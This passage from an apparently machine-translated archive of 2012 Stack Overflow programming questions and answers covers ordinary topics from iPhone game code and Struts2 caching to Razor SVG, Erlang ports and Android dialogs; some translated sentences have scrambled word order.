>     if (animationTimer) {
>         [self stopAnimation];
>         [self startAnimation];
>     } }
> 
> -(void) setupScore{
> 
>     scoreLabel = [NSString stringWithFormat:@"%d", score];
>     scoreLabel.frame = CGRectMake(262, 250, 100, 40);
>     [scoreLabel setText: scoreString];
> 
>     //normally you'll want a transparent background for your label
>     scoreLabel.backgroundColor = [UIColor clearColor]; 
> 
>     //you can use non-standard fonts
>     [scoreLabel setFont:[UIFont fontWithName:@"TimesNewRoman" size: 1.0f]];
> 
>     //change the label's text color
>     scoreLabel.textColor = [UIColor whiteColor];
> 
>     //add it to your view
>     scoreLabel.transform = CGAffineTransformMakeRotation(89.53);
>     [self addSubview:scoreLabel]; }
> 
> -(void) resetScore {
>     score = 0;
>     scoreLabel.textColor = [UIColor blackColor];
>     [scoreLabel release]; }
> 
> -(void)drawScore{  
>     [scoreLabel setText: scoreString]; }
> 
> -(void) checkSquareToCircleCollisions{
>     NSMutableArray *array = [squares getSquares];
> 
>     for(int i = 0; i < [squares getCount]; i++){
> 
>         Square *s = [array objectAtIndex: i];
> 
>         CGRect rect1 = [player getRect];
>         CGRect rect2 = [s getRect];
> 
>         if (CGRectIntersectsRect(rect1, rect2)){
> 
>             player.alive = NO;
>             gameState = 2;
> 
>         }
> 
>     } }
> 
> -(void) checkSquareToSquareCollisions{
>     NSMutableArray *array = [squares getSquares];
> 
>     for(int i = 0; i < [squares getCount]; i++){
> 
>         Square *s = [array objectAtIndex: 0];
>         Square *ss = [array objectAtIndex: i];
> 
>         CGRect rect1 = [s getRect];
>         CGRect rect2 = [ss getRect];
> 
>         if (CGRectIntersectsRect(rect1, rect2)) {
>             [s setDirection: [s getXDir] * -1 : [s getYDir] * -1];
>             [ss setDirection: [ss getXDir] * -1 : [ss getYDir] * -1];
>         }
> 
>     } }
> 
> -(void) spawnSquares {
>     // FINISH METHOD
>      }
> 
> -(void) touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event {
> 
>     if(gameState == 0){
> 
>         //MENU
> 
>         UITouch *touch = [[event allTouches] anyObject];
> 
>         gameState = 1;
>         //[self initGame];
> 
>     } else if(gameState == 1){
> 
>         //GAMEPLAY
> 
>         UITouch *touch = [[event allTouches] anyObject];
>         CGPoint touchPos = [touch locationInView:touch.view];
>         touchPos.y = 480 - touchPos.y;
>         [player setPos: touchPos];
> 
>     } else if(gameState == 2){
> 
>         //DEATH SCREEN
> 
>         UITouch *touch = [[event allTouches] anyObject];
> 
>         gameState = 0;
>         //[self resetScore];
>         [self initGame];
>     } }
> 
> -(void) touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event {
> 
>     if(gameState == 0){
> 
>         //MENU
> 
>         UITouch *touch = [[event allTouches] anyObject];
> 
>         //[self initGame];
> 
>     } else if(gameState == 1){
> 
>         //GAMEPLAY
> 
>         UITouch *touch = [[event allTouches] anyObject];
>         CGPoint touchPos = [touch locationInView:touch.view];
>         touchPos.y = 480 - touchPos.y;
>         [player setPos: touchPos];
> 
>     } else if(gameState == 2){
> 
>         //DEATH SCREEN
> 
>         UITouch *touch = [[event allTouches] anyObject];
> 
>     }}
> 
> - (void)accelerometer:(UIAccelerometer *)accelerometer
>         didAccelerate:(UIAcceleration *)acceleration {
> 
>     point.y = acceleration.y * 10;
>     point.x = acceleration.x * 10;
> 
>     CGPoint pos = [player getPos];
> 
>     pos = CGPointMake(pos.x + point.x, pos.y + point.y);
>     [player setPos: pos];
> 
>     //Right - MAY HAVE TO CHANGE
>     if(pos.x < 0){
>         pos = CGPointMake(320, pos.y);
>     }
> 
>     //left
>     if(pos.x < 320){
>         pos = CGPointMake(0, pos.y);
>     }
> 
>     //Top
>     if(pos.y < 0){
>         pos = CGPointMake(pos.x, 460);
>     }
> 
>     //Bottom
>     if(pos.x < 460){
>         pos = CGPointMake(pos.x, 0);
>     }
>      }
> 
> - (void)dealloc {
> 
>     [self stopAnimation];
> 
>     if ([EAGLContext currentContext] == context) {
>         [EAGLContext setCurrentContext:nil];
>     }
> 
>     [context release];  
>     [player release];
>     [menu release];
>     [sharedSoundManager release];
>     [bk release];
>     [squared release];
>     [squares release];
>     [scoreLabel release];
>     [scoreString release];
> 
>     [super dealloc]; }
> 
> @end // here it says: excepted } and also its excepting @end 
> ```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:03:18.563

您`runContinueCountdown`在第二个 if 语句的末尾缺少一个大括号。

```
if(timer <= 300){
            if(timer > 200){
                countdownNum = 3;
            } 
```

`if`在此语句的末尾添加一个大括号

# html - DocBook with WebHelp - 你能在 HTML 页面的根部指定一个页面锚点并在文档深处找到它吗？

> ID：12009039
> 
> 赞同：0
> 
> 时间：2012-08-17T15:51:19.857
> 
> 标签：html, docbook

我正在使用 WebHelp 来呈现我的 DocBook 文档。

在我的 DocBook 文件中，如果我有如下锚点：

```
<anchor id="thisIsSomeExample" /> 
```

我可以使用以下 URL 在我的 WebHelp 渲染中访问它：

```
http://localhost:8080/MyWebHelpProject/book/pages/ch01s01.html#thisIsSomeExample 
```

这很棒，但我真正想做的是找到那个锚，不管我的屏幕上当前打开的任何章节的哪个部分：

```
http://localhost:8080/MyWebHelpProject/book/pages/#thisIsSomeExample 
```

这可能吗？

**编辑：**按照在一个页面中呈现整个文档的合理建议，`@Sitapati Das`我必须补充一点，我们需要按章节拆分文档。文档非常大（以 A4 打印时超过 300 页）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T01:09:40.413

如果您将帮助文件呈现为 html-single 并使用唯一的锚点 ID，这将是可能的。

# c# - ListView.Refresh“清除”列表视图

> ID：12009048
> 
> 赞同：2
> 
> 时间：2012-08-17T15:51:57.817
> 
> 标签：c#, regex, file-io, directory, case-insensitive

我的代码正在循环操作并向列表视图控件添加反馈。以前，我的代码一直运行良好，但今天发生了一些变化......

listview 控件的开头是这样的： ![前](../Images/d7e0b74ad2946fd1114350aabdbd9911.png)

...但是在我发出对 Update() 或 Refresh() 的调用后，它并没有显示我添加的项目，而是呈现如下：

![后](../Images/12dec34316a8d14ca6328ddff02900f6.png)

此时，该控件仍处于启用状态且可见。事实上，我的代码与它的唯一交互是添加新项目和 Update()。

要添加项目，我使用以下内容：

```
lvwDrawings.Items.Add(new ListViewItem(new string[]
{
    drawing.PartNo,
    drawing.Revision.ToString(),
    drawing.Issue,
    drawing.DrgTypeText,
    errorStatus !=null ? errorStatus : drawing.Status,
    drawing.Filepath
})); 
```

万一我在这里引入了一些问题，我用更简单的进行了测试`lvwDrawings.Items.Add("test");`，但结果是一样的。如果我执行 QuickWatch，控件会正确告诉我它包含 x 个项目...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T17:44:59.293

好的，我找到了问题 - 出于某种未知原因，我之前不得不`lvwDrawings.Items.Clear()`在不同运行之间清除列表，但不知何故我最终得到了`lvwDrawings.Clear()`. 这不仅会清除列表视图中的项目，还会清除列。

有两个方面很好奇：我会认为，当我尝试添加具有特定列的 ListViewItem 时，如果没有任何列，它会反对，而且，当我制作改变（？？！）。

*适度有趣的转移：*

我通过在第一个列表视图下面创建第二个列表视图发现了问题，并一直工作直到遇到问题。作为该过程的一部分，我在设计中添加了列，其中一个我称之为`Path`，设计师没有反对。

但是，在代码中，对静态类 Path（例如`Path.GetDirectoryName()`）的方法的引用导致错误 - 'ColumnHeader Path 没有方法 'xxx'' 或类似的。显然，它假定当我提到路径时，我指的是列表视图中的列。

此外，当我重命名列（到“FullPath”）时，它重命名了代码中对 Path 的所有引用，例如。`FullPath.GetDirectoryName()`……

# struts2 - 清除缓存拦截器struts2不工作

> ID：12009049
> 
> 赞同：1
> 
> 时间：2012-08-17T15:52:03.573
> 
> 标签：struts2

我写了一个拦截器来防止缓存，但页面仍然缓存。

拦截器：

```
public class ClearCacheInterceptor implements Interceptor {
    public String intercept(ActionInvocation invocation)throws Exception{
        String result = invocation.invoke();

        ActionContext context = (ActionContext) invocation.getInvocationContext();
        HttpServletRequest request = (HttpServletRequest) context.get(StrutsStatics.HTTP_REQUEST);
        HttpServletResponse response=(HttpServletResponse) context.get(StrutsStatics.HTTP_RESPONSE);

        response.setHeader("Cache-Control", "no-store");
        response.setHeader("Pragma", "no-cache");
        response.setDateHeader("Expires", 0);

        return result;
    }

    public void destroy() {}
    public void init() {}
} 
```

Struts.xml

```
<struts>
  <constant name="struts.devMode" value="true"/>
  <constant name="struts.enable.DynamicMethodInvocation" value="false" />

  <package name="default" extends="struts-default">
    <interceptors>  
      <interceptor name="caching" class="com.struts.device.interceptor.ClearCacheInterceptor"/>
      <interceptor-stack name="cachingStack">      
        <interceptor-ref name="caching" />     
        <interceptor-ref name="defaultStack" />    
      </interceptor-stack> 
    </interceptors>

    <action name="Login" class="struts.device.example.LogIn">
      <interceptor-ref name="cachingStack"/>
      <result>example/Add.jsp</result>
      <result name="error">example/Login.jsp</result>
    </action>
  </package>
</struts> 
```

应用程序工作正常；它执行拦截器，但不会阻止缓存。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-20T09:38:28.317

我已经解决了我的问题。感谢开发人员工具帮助我追踪。

我的代码中的轻微序列更改帮助了我：根据[Struts 2 拦截器文档](http://struts.apache.org/development/2.x/docs/writing-interceptors.html)，结果在返回*之前* 呈现。`invocation.invoke()`在结果呈现回客户端之前设置标头会在返回的结果中设置标头。

IE，

```
public String intercept(ActionInvocation invocation)throws Exception{
    HttpServletResponse response = ServletActionContext.getResponse();

    response.setHeader("Cache-Control", "no-store");
    response.setHeader("Pragma", "no-cache");
    response.setDateHeader("Expires", 0);

    return invocation.invoke();
} 
```

# asp.net - 如何使用 MVC Razor 生成 SVG

> ID：12009054
> 
> 赞同：4
> 
> 时间：2012-08-17T15:52:21.280
> 
> 标签：asp.net, asp.net-mvc-3, razor, svg

我们正在尝试为我的 MVC3 应用程序制作一个 SVG 生成的单选按钮控件。理想情况下，控件将是一个局部视图，我们将传入一个模型，该模型将包含有关如何使用 Razor 生成 SVG 的数据。

我们尝试将 SVG 正常写入 Razor，但除了编译错误，我们什么也得不到。

我们如何使用 MVC3 Razor 生成 SVG？

错误是：`Expression Must Return a Value To Render`

**编辑**：错误不是来自局部视图，但是当我们调用 @Html.RenderPartial("SvgRadioButtonControl", ((IResponseLabeledItem)Model).ResponseOptions) 时，它会给出错误。

```
 @using SmartQWeb.Models.Entities
@model IEnumerable<ResponseOption>
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   version="1.1"
   width="300"
   height="400"
   id="radio">
  <script type="application/ecmascript"><![CDATA[
      var innerCircleExpandedSize = 11;
      function ResponseOptionClicked(evt) {
          console.log('Response option clicked');

          // Remove circle in enabled element
          var enabledElem = document.getElementsByClassName('enabled')[0];
          if (enabledElem != undefined) {
              console.log('Removing a inner circle');
enabledElem.getElementsByClassName('response-innercircle')[0].setAttribute('r', 0);
              enabledElem.className.baseVal = enabledElem.className.baseVal.replace('enabled', 'disabled')
          }

          // Add circle in radio button
          console.log('Adding a inner circle');
evt.currentTarget.getElementsByClassName('response-innercircle')[0].setAttribute('r', innerCircleExpandedSize);
          evt.currentTarget.className.baseVal = evt.currentTarget.className.baseVal.replace('disabled', 'enabled');
      }
  ]]></script>
    <g id="base">
        @{
            int iteration = 1;
        }
        @foreach (ResponseOption option in Model)
        {
            <g id="response-never" class="response-option disabled" transform="translate(50,@{ (iteration++ * 1).ToString(); })" onclick="ResponseOptionClicked(evt)" fill="#ffffff">
                <circle class="response-outercircle" r="18" stroke="#000000" stroke-width="3" stroke-miterlimit="4" stroke-opacity="1" stroke-dasharray="none" />
                <circle class="response-innercircle" r="0" fill="#000000" stroke="#000000" />
                <text x="40"  y="6.5" font-size="1.5em" fill="blue" class="response-text">@option.Label</text>
            </g>
        }
    </g>
</svg> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-17T17:57:02.507

代替：

```
@Html.RenderPartial("SvgRadioButtonControl", ((IResponseLabeledItem)Model).ResponseOptions) 
```

和：

```
@{Html.RenderPartial("SvgRadioButtonControl", ((IResponseLabeledItem)Model).ResponseOptions);} 
```

或者，如果您愿意：

```
@Html.Partial("SvgRadioButtonControl", ((IResponseLabeledItem)Model).ResponseOptions) 
```

您的部分中的以下表达式也很臭：

```
@{ (iteration++ * 1).ToString(); }) 
```

你不是说：

```
@(iteration++) 
```

# c# - 尝试使用 c# 发送邮件错误：错误太多

> ID：12009059
> 
> 赞同：3
> 
> 时间：2012-08-17T15:52:52.213
> 
> 标签：c#, smtp

我正在尝试将邮件发送到大约。2000 个用户。我确信credentails没有任何问题。

这是我的代码：

```
SmtpClient client = new SmtpClient();
client.EnableSsl = false;
client.DeliveryMethod = SmtpDeliveryMethod.Network;
client.Host = "---";
client.Port = 587;
client.UseDefaultCredentials = false;
client.Credentials = new System.Net.NetworkCredential("---", "---");

MailMessage msg = new MailMessage();
msg.IsBodyHtml = true;
msg.Body = "dfsdf";
msg.BodyEncoding = System.Text.Encoding.UTF8;
msg.Subject = "sdfsdf";
msg.From = new MailAddress("---");

msg.Bcc.Clear();
MembershipUserCollection muc = Membership.GetAllUsers();
foreach (MembershipUser mu in muc)
{
    msg.Bcc.Add(mu.Email);
}

try
{
    client.Send(msg);
}
catch (Exception ex)
{
    Label_info.Text = ex.Message;
    if (ex.InnerException != null) Label_info.Text += "<br />" + ex.InnerException.Message;
    return;
} 
```

这是我得到的例外：服务不可用，正在关闭传输通道。服务器响应为：4.7.0 [我的 smtp 名称] 错误：错误太多

# c# - 使用 ajax 日历扩展更新服务器端图表范围

> ID：12009062
> 
> 赞同：1
> 
> 时间：2012-08-17T15:53:02.793
> 
> 标签：c#, asp.net

这可能是一个长镜头，但我正在尝试使用客户端 ajax 日历为我的服务器端图表的 x 轴选择一个日期范围。我设置了两个控件，我只是不确定如何让它们相互通信，或者是否有可能。

这是我到目前为止所拥有的：

```
<table>
  <tr>
     <td>
      Start Date
     </td>
     <td>
     <asp:TextBox ID="StartDateTextBox" runat="server"></asp:TextBox>
     <ajaxToolkit:CalendarExtender ID="StartCal" runat="server" 
          TargetControlID="StartDateTextBox">
     </ajaxToolkit:CalendarExtender>

     </td>
     <td>
     End Date
     </td>
     <td>
     <asp:TextBox ID="EndDateTextBox" runat="server"></asp:TextBox>
     <ajaxToolkit:CalendarExtender ID="EndCal" runat="server"   TargetControlID="EndDateTextBox">
      </ajaxToolkit:CalendarExtender>
      </td>
  </tr>
  <tr>
     <td colspan="4">
        <asp:Chart ID="TrendChart" runat="server" Width="800px" Height="400px">
           <Series>
              <asp:Series Name="Trend" ChartType="Line">
              </asp:Series>
           </Series>

           <ChartAreas>
              <asp:ChartArea Name="ChartArea1" Area3DStyle-Enable3D="true">
              </asp:ChartArea>
           </ChartAreas>
        </asp:Chart>
        </td>
    </tr>
    <tr>
        <td align="center" colspan="4">
            <asp:Button ID="TrendChartButton" runat="server" Text="Export To CSV" 
                CommandArgument="TrendChart" onclick="OverviewChartButton_Click" />
        </td>
    </tr>

</table 
```

# asp-classic - 处理一个巨大的经典 asp 项目

> ID：12009066
> 
> 赞同：3
> 
> 时间：2012-08-17T15:53:17.940
> 
> 标签：asp-classic

我一直在使用一个包含 500 多个文件的 ASP Classic 站点，其中一些未使用，其中一些已使用；以及具有数百个过程、函数和表的数据库，形状相同。

我需要一种方法来控制该项目，以便最终可以迁移它。我还没有时间浏览每个页面并查看 SQL（存储过程在数据库中，并且在 ASP 页面中被正确调用），所以我不知道如何处理这。

我的直接想法是制作 ASP 类并将它们放入页面中——它们几乎可以用于获取和设置字段、验证以及将记录集发送到显示功能中。

这是一个合理的方法吗？我错过了一些策略吗？

你会如何处理这个问题？此时考虑迁移到另一个平台，但在短期内（接下来的几个月）不可行

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T17:02:12.390

您可以尝试使用[http://aspclassiccompiler.codeplex.com/](http://aspclassiccompiler.codeplex.com/)编译项目，或者您可以一次迁移到 ASP.net MVC 一页（需要时）并同时使用两者的混合。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T21:16:31.803

我的简单建议是停止思考代码。花更多时间在实际使用它的 UI 上，并花时间详细检查数据库模式。

**编辑**

如果您试图确定哪些页面处于活动状态，则使用 IIS 日志记录来收集不同的页面命中。还可以编写一些脚本来收集文件的名称，并在站点中搜索文件以查找这些文件的任何出现。此信息应标识站点中很少使用或已失效的部分。

然而，在“活动”文件中很可能会有相当多的内容，这些内容也是死的。让我重申一下，实际上不要在这个阶段添加类或重构代码，你应该专注于理解它没有做*什么而不是它是**如何*做到的。了解 DB Schema 是至关重要的一步，然后了解哪些 UI 交互会带来 DB 中的特定更改。

# c - 是否可以从 erlang 节点启动外部二进制应用程序？

> ID：12009070
> 
> 赞同：1
> 
> 时间：2012-08-17T15:53:32.280
> 
> 标签：c, erlang

我想从 erlang 节点启动一些程序，将一些数据传输到其标准输入并在完成后读取标准输出。可能吗？

是的，我现在介绍 C 节点，但我不想重写我的二进制应用程序。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T08:58:15.613

我使用 open_port：

```
run (Cmd, Params, State, Stage, PrevStage) ->
  Shell = Cmd ++ " " ++ binary_to_list (Params) ++ " 1>/dev/null 2>/dev/null",
  io:format ("try to run: ~p~n", [Shell]),
  Port = open_port ({spawn, Shell}, [exit_status]), 
```

# javascript - 我无法在 jQuery 事件函数之外访问数组/obj

> ID：12009071
> 
> 赞同：0
> 
> 时间：2012-08-17T15:53:32.480
> 
> 标签：javascript, jquery, arrays, object, global

所以我有一个对象或数组，在任何东西的开头声明，在一切之外：

```
var Thing = {title:'horse'}; 
```

然后我有： -

```
$('.clickedIt').fadeOut(200, function() { console.log(Thing.title); } 
```

那将失败。但是，如果我将退出淡出的同一个控制台日志放在上面，那就没问题了。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T15:55:55.460

如果您希望某些东西是全局的，只需在`window`Object 上定义它。

```
window.Thing = { title: 'horse '}; 
```

然后像这样使用它：

```
$( '.clickedIt' ).fadeOut(200, function() { 
    console.log( window.Thing.title ); 
}); 
```

请注意，不建议在对象上放置一些变量`window`，我建议查看名称间距：[http ://addyosmani.com/blog/essential-js-namespacing/](http://addyosmani.com/blog/essential-js-namespacing/)

这是一个例子：

```
//simple JavaScript module
( function( window ) {
    //define your applications root namespace
    window.myApp = {
        Thing: { title: 'horse '}
    };
})( window );

//jQuery ready function
$( function() {
    $( '.clickedIt' ).fadeOut( 200, function() { 
        console.log( myApp.Thing.title ); 
    });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T15:58:56.427

您分配给标题 horse 的值是未定义的，将其用引号括起来以使其成为字符串字面量，

**[现场演示](http://jsfiddle.net/4VvKT/1/)**

```
var Thing = {title:'horse'};
$('.clickedIt').fadeOut(200, function() { console.log(Thing.title); })​ 
```

# android - android将对象成员从alertdialog传回listview

> ID：12009073
> 
> 赞同：3
> 
> 时间：2012-08-17T15:53:48.250
> 
> 标签：android, listview, tabs, android-alertdialog

`that when clicked, opens an`我在 TabActivity AlertDialog `with 2`EditText Views中有一个按钮，`用于输入名称和编号。`

 `当我单击确定`Button`关闭 时，`Dialog`我想将名称传递回`ListView`. 我可以将名称传`TabActivity`回. 但是除了名称之外的其他内容显示在.`EditText``mAlertDialog``TabActivity``ListView`

它看起来像是对对象“widget”的引用（`Widget`是类的对象`Device`，它有`getName`,`setName`方法），com.mypackage.Device@419226e0。

我将尝试在下面发布相关代码（是的，我知道我没有使用`Fragments`。我发现很难使用 with 实现水平滚动标签`ListView`）`Fragments`：

```
@SuppressWarnings("deprecation")

public class MainActivity extends TabActivity implements OnClickListener {

    public static ArrayList<Device> deviceList = new ArrayList<Device>();
    public static ArrayAdapter<Device> deviceAdapter=null;
    private static ListView deviceListView;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

    mTabHost= getTabHost();
        TabHost.TabSpec spec;
        Intent intent;

    rButton = (Button)findViewById(R.id.button_register);
        mAlertDialog = (EditText)findViewById(R.id.edittextresult_Name);

    rButton.setOnClickListener(onRegister);

    intent = new Intent (this, devices.class);
        spec = mTabHost.newTabSpec("devices")
            .setIndicator("Devices")
            .setContent(R.id.devices);
        mTabHost.addTab(spec);

    deviceListView=(ListView)findViewById(R.id.rdevices);
        //Attach array adapter to data array "deviceList"
        deviceAdapter = new ArrayAdapter<Device>(this,android.R.layout.simple_list_item_1, deviceList);
        //connect adapter "deviceAdapter" to listview widget so the activity listview is populated with data from the array
        deviceListView.setAdapter(deviceAdapter);
    }

private View.OnClickListener onRegister = new View.OnClickListener() {

    public void onClick(View v) {
        String title = "Register";
            String buttonOk = "OK";
            String buttonCancel = "Cancel";
            String madd = "address";
            String name = "widget name";

            //get rdevice.xml view
            LayoutInflater li = LayoutInflater.from(context);
            View rView = li.inflate(R.layout.rdevice, null);

            AlertDialog.Builder adRegister = new AlertDialog.Builder(context);
            //set rdevice.xml to adRegister builder
            adRegister.setView(rView);

            //set title
            adRegister.setTitle(title);

            //Set EditText views to get user input

            final EditText mField = (EditText)rView.findViewById(R.id.editText_Address);
            final EditText nField = (EditText)rView.findViewById(R.id.editText_WidgetName);

            //set dialog message
        adRegister.setMessage("Message")
            .setCancelable(false)
            .setPositiveButton(buttonOk, new DialogInterface.OnClickListener() {

                public void onClick(DialogInterface dialog, int BUTTON_POSITIVE) {
                    // TODO Auto-generated method stub
                    Device widget = new Device();

                    String madd = mField.getText().toString();
                    String name = nField.getText().toString();

                widget.setName(name);
                widget.setAddress(madd);

                Log.d(TAG,  "Address: " + madd);
                    Log.d(TAG, "Widget name: " + name);

                    //get user input and set it to result on main activity
                    mAlertDialog.setText(nField.getText());

                    deviceAdapter.add(widget);
                    deviceAdapter.notifyDataSetChanged();

                }
            })
            .setNegativeButton(buttonCancel, new DialogInterface.OnClickListener() {

                public void onClick(DialogInterface dialog, int BUTTON_NEGATIVE) {

                }
            });

        //Create alert dialog
        AlertDialog alertDialog = adRegister.create();

        //show it
        adRegister.show();

        }

    }; 
```

在调试时，logcat 中没有错误。

然而，当我看到`mAlertDialog`它说的表达

> 无法检索此正确的封闭实例

即使应用程序中显示了正确的名称。当我在调试后让程序完成时，此引用显示在`ListView`“com.mypackage.Device@419226e0”中，而不是我在`AlertDialog`框中键入的名称。

这是否与范围或匿名内部类有关？请帮忙。我对Java不是很熟悉，所以我在这里迷失了细节。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-20T14:50:40.143

好的，我开始工作了。这非常有帮助：[http](http://www.ezzylearning.com/tutorial.aspx?tid=6816874) ://www.ezzylearning.com/tutorial.aspx?tid=6816874 ，特别是这句话

> 您可能想知道 ListView 将如何显示 Product 对象以及将显示 Product 对象的哪个属性。答案很简单，默认情况下，Android ListView 控件在每个 ListView 项中呈现一个简单的 TextView，而 TextView 控件只能显示简单的文本。注意我们上面定义的 Product 类中的 toString() 函数是如何被覆盖的。无论您从对象 toString() 函数返回什么字符串，都将显示在 ListView 项中呈现的 TextView 中。

基本上，在我的 Device.java 类中，我必须重写 toString 方法来指定要传递的对象成员，所以我包含了这段代码

```
@Override
public String toString(){
    return this.name;
} 
````

# ssis - 使用 NOCHECK 执行 SSIS 包

> ID：12009075
> 
> 赞同：0
> 
> 时间：2012-08-17T15:53:51.357
> 
> 标签：ssis, database-migration

我正在尝试导入通过 FK 链接的一系列表 - 我希望导入忽略这些键 (NOCHECK) 但我收到此错误。

[执行 SQL 任务] 错误：执行查询“TRUNCATE TABLE [dbo].[Users]”失败，出现以下错误：“无法截断表 'dbo.Users'，因为它被 FOREIGN KEY 约束引用。”。可能的失败原因：查询有问题，“ResultSet”属性设置不正确，参数设置不正确，或连接未正确建立。

我有检查约束'未检查'-如果我发出一个 sql 命令来删除导入工作的约束-所以看起来 SSIS 没有按预期的方式工作。

我正在打开一个使用导入/导出向导 fwiw 创建的包（在 vs10 shell - datatools 中）。

OLEDB驱动？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T17:54:08.993

SSIS 正在按应有的方式工作。这与您在 Management Studio 或任何其他 SQL 执行中获得的行为完全相同。在此处查看答案： [https ://stackoverflow.com/a/253858/236348](https://stackoverflow.com/a/253858/236348)

即使关闭检查约束，您也不能截断带有外键的表。

# r - R中大型稀疏矩阵的聚类分析

> ID：12009078
> 
> 赞同：3
> 
> 时间：2012-08-17T15:53:58.610
> 
> 标签：r, sparse-matrix

我有一个包含 250000 个事务（行）和 2183 个项目（列）的事务数据集。我想将其转换为稀疏矩阵，然后对其进行层次聚类。我尝试了包'sparcl'，但它似乎不适用于稀疏矩阵。关于如何解决这个问题的任何建议？或者我可以用来对稀疏矩阵进行聚类分析的任何其他包？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-02-13T20:01:34.537

在 apcluster 包中实现的亲和传播从 1.4.0 版本开始支持稀疏矩阵。所以请试一试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T00:41:36.523

[亲和力传播](http://cran.r-project.org/web/packages/apcluster/index.html)是否适用于您的数据？它似乎可以处理稀疏矩阵。

# asp.net-mvc-3 - 将项目符号和斜体重新添加到 CkEditor

> ID：12009079
> 
> 赞同：1
> 
> 时间：2012-08-17T15:53:59.090
> 
> 标签：asp.net-mvc-3, ckeditor

我继承了一个使用 CkEditor 的 MVC3 C# .Net Web App。另一个开发人员（不再在这里）从 CkEditor 框中删除了插入粗体文本和斜体文本的功能。如何将粗体和斜体功能重新添加回 CkEditor？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:57:23.420

我找到了答案。.toolbar 配置属性的属性已被删除。IE

```
 toolbar: [
            { name: 'insert', items: ['Image'] },
            { name: 'tools', items: ['Maximize'] },
        ], 
```

我修改为：

```
 toolbar: [
            { name: 'insert', items: ['Image'] },
            { name: 'tools', items: ['Maximize'] },
            ['Bold', 'Italic', 'Underline'], ['NumberedList', 'BulletedList']
        ], 
```

这是帮助我的网址：[CkEditor Config Stuff](http://fogbugz.stackexchange.com/questions/6330/using-ckeditor-in-a-new-plugin)

# java - 在实现的抽象方法中调用超类方法

> ID：12009080
> 
> 赞同：1
> 
> 时间：2012-08-17T15:54:01.357
> 
> 标签：java, inheritance, abstract-class

基本上，我需要几种方法来做同样的事情，但子类可以选择不同的参数，并且仍然强制实现。这是正确的方法/设计吗？

编辑：我已经编辑了 addItem() 主体，这些方法包含用于处理传递参数的最终逻辑

```
public abstract Class A {
    public abstract void addItemImpl()

    addItem(String s) {
        // do stuff
    }
    addItem(Collection c) {
       // do stuff
    }
    addItem(Item item) {
        // do stuff
    }
}

public  Class B extends A {
    addItemImpl() {
        addItem("text, text2")
    }
}

public Class C extends A {
    addItemImpl() {
        addItem([item, item2])
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:03:51.107

不，这行不通。

您将无法定义“doStuff()”方法，因为您必须处理参数。您提供的信息不足以为您提供详细的帮助。但是泛型可能会派上用场：

```
public abstract Class A<T> {
    public addItem(T t) {
        // dostuff with t
    }
}

public  Class B extends A<String> {
}

public Class C extends A<Collection> {
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:09:07.810

这是一个完美的案例：**优先组合而不是继承。**

您的子类不能完全从超类中受益，也不依赖于它的实现细节。然后为合约定义一个接口，`B`必须`C`遵守 ( `addItemImpl()`) 并用`A`.

问问自己：**真的是****一个？真的是和？`B``A``C``A`**

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T16:02:50.163

你所拥有的在技术上是正确的，但是如果不知道`addItem`实际是什么，就很难知道这是否是最好的解决方案。我的猜测是可能有更好的方法。

如果`addItem`本质上设置要在 doStuff 中使用的值，我只会在 Class 中完成这项工作，`B`而`C`不是。任何其他需要以与`B`扩展它相同的方式而不是`A`.

编辑：根据您的编辑，我会说这可能是使用抽象类的一个坏例子。没有真正共享的功能。一个接口会更合适，因为每个接口都需要不同的实现。您只是想将其隐藏在抽象类中。我会更改`A`为接口以及使用泛型。

只有在所有类中实际上存在完全相同的共享代码时才走抽象类路线，而无需采取任何技巧使其工作（如上所示）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-17T15:58:00.510

如果您需要强制实现少数方法，那么`Abstract`方法是理想的。

但要小心，只有超类的**第一** `Non-Abstract` **个子类才能实现其中的所有抽象方法......**

# php - 适用于 PHP 的 Google 警报 API

> ID：12009082
> 
> 赞同：3
> 
> 时间：2012-08-17T15:54:21.403
> 
> 标签：php, google-alerts

那里有免费的 Google alert Api 吗？我正在尝试使用 google alert 构建 php 应用程序。但是好像没有这个api

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-19T09:17:09.500

spryno724 提供的站点不允许您下载该库，我也尝试联系作者但没有回应。

最后经过大量搜索后，我在这里找到了一个最近可用的 php lib：

[http://coders11.com/googlealertsapi](http://coders11.com/googlealertsapi)

**最后更新：2014 年 11 月 2 日：** 由于各种原因，该课程不再免费。您可以以 60 欧元 / 67 美元的价格购买完整的商业许可证

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2012-08-17T15:58:06.640

首先，您尝试过什么？如果你没有表明你已经先研究过这个问题，你可能会在这里得到很多这个问题。

似乎没有任何官方的 Google Alert API，但这里有一些 PHP 的第三方 API：

*   [http://nicholasdejong.com/story/api-google-alerts](http://nicholasdejong.com/story/api-google-alerts)
*   [http://oktaykilic.com/programming/google-alerts-api-class/](http://oktaykilic.com/programming/google-alerts-api-class/)（在重复问题的回答中提到）

# iphone - iPhone：等到 UIView 动画完成

> ID：12009086
> 
> 赞同：1
> 
> 时间：2012-08-17T15:54:29.297
> 
